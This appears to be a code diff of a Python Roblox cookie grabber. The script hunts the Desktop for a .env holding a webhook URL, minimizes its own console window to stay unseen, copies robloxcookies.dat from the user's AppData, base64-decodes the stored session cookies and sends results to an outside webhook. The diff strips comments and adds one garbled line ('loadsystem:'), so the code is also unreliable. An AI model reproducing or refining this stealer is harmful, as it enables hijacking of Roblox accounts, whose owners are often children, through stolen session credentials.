@@ -10,7 +10,6 @@ from datetime import datetime, timezone
 from time import time as __, sleep as zzz
 from dotenv import load_dotenv
 
-# Find Desktop directory and locate Roblox Tools/edit file/.env
 desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
 env_path = None
 for root, dirs, _ in os.walk(desktop_path):
@@ -18,17 +17,15 @@ for root, dirs, _ in os.walk(desktop_path):
         env_path = os.path.join(root, "Roblox Tools", "edit file in this folder", ".env")
         break
 
-# Fallback to .env in script's current directory
 fallback_env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
 
 if env_path and os.path.exists(env_path):
     load_dotenv(env_path)
 elif os.path.exists(fallback_env_path):
-    load_dotenv(fallback_env_path)
+    loadsystem: load_dotenv(fallback_env_path)
 else:
     print(f"[{datetime.fromtimestamp(__(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] → Error: .env file not found in Roblox Tools/edit file in this folder/ on Desktop or in {fallback_env_path}")
 
-# Get webhook URL from environment variable
 WEBHOOK_URL = os.getenv("WEBHOOK_URL_GRABBER")
 
 def log(text, sleep=None):
@@ -54,17 +51,13 @@ def send_webhook(content):
         log(f"Webhook error: {str(e)}")
 
 def minimize_console():
-    # Minimize the console window
     hwnd = win32gui.GetForegroundWindow()
     win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
 
 def retrieve_roblox_cookies():
-    # Minimize the console immediately
     minimize_console()
-
     user_profile = os.getenv("USERPROFILE", "")
     roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
-
     if not os.path.exists(roblox_cookies_path):
         log(f"Cookie file not found at {roblox_cookies_path}")
         embed = {
@@ -74,16 +67,13 @@ def retrieve_roblox_cookies():
         }
         send_webhook(embed)
         return
-
     temp_dir = os.getenv("TEMP", "")
     destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
     shutil.copy(roblox_cookies_path, destination_path)
-
     with open(destination_path, 'r', encoding='utf-8') as file:
         try:
             file_content = json.load(file)
             encoded_cookies = file_content.get("CookiesData", "")
-            
             if encoded_cookies:
                 decoded_cookies = base64.b64decode(encoded_cookies)
                 try:
@@ -109,7 +99,6 @@ def retrieve_roblox_cookies():
                     "color": 0xFF0000
                 }
                 send_webhook(embed)
-        
         except json.JSONDecodeError as e:
             log(f"Error while parsing JSON: {e}")
             embed = {
